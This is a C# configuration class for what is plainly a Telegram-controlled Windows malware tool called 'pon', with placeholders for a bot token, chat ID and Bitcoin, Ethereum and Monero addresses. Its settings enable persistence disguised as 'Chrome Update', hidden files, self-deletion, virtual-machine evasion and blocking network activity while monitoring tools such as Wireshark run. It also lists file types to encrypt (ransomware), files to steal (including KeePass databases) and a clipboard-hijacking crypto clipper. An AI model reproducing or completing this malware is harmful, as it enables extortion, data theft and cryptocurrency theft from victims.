namespace pon
{
    internal sealed class config
    {
        public const string TelegramToken = "You'r bot token from bofather";
        public const string TelegramChatID = "You't chat id";
        public static int TelegramCommandCheckDelay = 1;
        
        public static bool AdminRightsRequired = true;
        public static bool AttributeHiddenEnabled = true;
        public static bool AttributeSystemEnabled = true;
        public static bool MeltFileAfterStart = true;
        public static string InstallPath = @"C:\Users\pon\pon.exe";
        
        public static bool AutorunEnabled = true;
        public static string AutorunName = "Chrome Update";
        
        public static bool ProcessBSODProtectionEnabled = true;
        
        public static bool HideConsoleWindow = true;
        
        public static bool PreventStartOnVirtualMachine = true;
        
        public static int StartDelay = 0;
       
        public static bool BlockNetworkActivityWhenProcessStarted = true;
        
        public static string[] BlockNetworkActivityProcessList =
        {
            "taskmgr", "processhacker",
            "netstat", "netmon", "tcpview", "wireshark",
            "filemon", "regmon", "cain"
        };
        
        public static string[] EncryptionFileTypes =
        {
            ".lnk", 
            ".png", ".jpg", ".bmp", ".psd",
            ".pdf", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".csv", ".sql", ".mdb", ".sln", ".php", "py", ".asp", ".aspx", ".html", ".xml"
        };
        
        public static long GrabFileSize = 6291456;
        
        public static string[] GrabFileTypes =
        {
            ".kdbx",
            ".png", ".jpg", ".bmp",
            ".pdf", ".txt", ".rtf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".sql", ".php", ".py", ".html", ".xml", ".json", ".csv"
        };
        
        public static bool AutoStealerEnabled = false;
        
        public static bool ClipperEnabled = true;
        
        public static string bitcoin_address = "Adress";
        public static string etherium_address = "Adress";
        public static string monero_address = "Adress";
    }
}
